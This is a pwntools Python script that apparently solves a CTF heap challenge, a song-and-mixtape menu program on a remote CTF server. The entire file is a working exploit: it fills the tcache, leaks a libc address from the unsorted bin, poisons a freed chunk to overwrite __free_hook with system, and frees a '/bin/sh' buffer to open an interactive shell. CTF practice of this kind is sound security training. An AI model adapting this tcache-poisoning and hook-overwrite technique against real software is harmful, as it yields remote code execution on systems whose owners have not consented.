from pwn import *

context.terminal = ["tmux", "split-window", "-h", "-p 60"]

libc = ELF("./libc-2.27-dbg.so", checksec=False)
#libc = ELF("./libc-2.30.so", checksec=False)

def add_song(idx, name, lyrics):
    r.sendlineafter(">", str(1))
    r.sendlineafter(":", str(idx))
    r.sendlineafter("\n", name)
    r.sendlineafter("\n", lyrics)

def drop_mixtape():
    r.sendlineafter(">", str(2))
    return r.recvuntil("[1]")

def edit_song(idx, lyrics):
    r.sendlineafter(">", str(4))
    r.sendlineafter("\n", str(idx))
    r.sendlineafter("\n", lyrics);

def delete_song(idx):
    r.sendlineafter(">", str(3))
    r.sendlineafter("\n", str(idx))


def exploit(r):
    #gdb.attach(r)
    #pause()
    # fill up tcache
    add_song(0, "LEAK", "TESTTEST")
    for i in range(1, 8):
        add_song(i, "AAAA", "BBBB")


    for i in range(7, -1, -1):
        delete_song(i)


    # leak libc
    unsorted_bin = drop_mixtape()
    log.info(hexdump(unsorted_bin))
    #[0x37 + 4:][0:6]
    #.rjust(8,b"\x00")
    #log.info(f"{hexdump(unsorted_bin)=}")
    unsorted_bin = unsorted_bin[0x37 + 4:][0:6].ljust(8,b"\x00")
    log.info(hexdump(unsorted_bin))
    libc_base = u64(unsorted_bin) - libc.symbols["main_arena"] - 96
    system = libc_base + libc.symbols["system"]
    free_hook = libc_base + libc.symbols["__free_hook"]
    log.info(f"{hex(free_hook)}")

    edit_song(1, p64(free_hook))
    #gdb.attach(r)
    #pause()
    add_song(8, "OHAYOU", p64(system))
    add_song(8, "OHAYOU", p64(system))
    add_song(9, "SHELL BOIS", b"/bin/sh\x00")
    delete_song(9)
    r.interactive()

if __name__ == '__main__':
    #r = process("./test_pwn", env={"LD_PRELOAD":"./libc-2.27.so"})
#    r = remote("localhost",9001)
    r = remote("chal.utc-ctf.club", 36525)
    exploit(r)
